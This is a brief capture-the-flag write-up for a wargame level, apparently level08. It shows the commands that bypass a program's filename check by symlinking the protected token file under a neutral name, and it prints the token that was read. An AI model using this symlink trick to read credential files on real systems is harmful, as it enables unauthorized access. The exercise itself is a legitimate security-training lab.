I bypassed the filename check by creating a symlink to the real token file and passing that link to the program.
the symlink shoudn't contain  'token' keyword in the name of the file ,

Commands I ran:
    "ln -s ~/token /tmp/other"
    "./level08 /tmp/other"
then i got 
     'quif5eloekouj29ke0vouxean' to access 
   
   home/flag/flag08

finally i used getflag to get the flag of level09
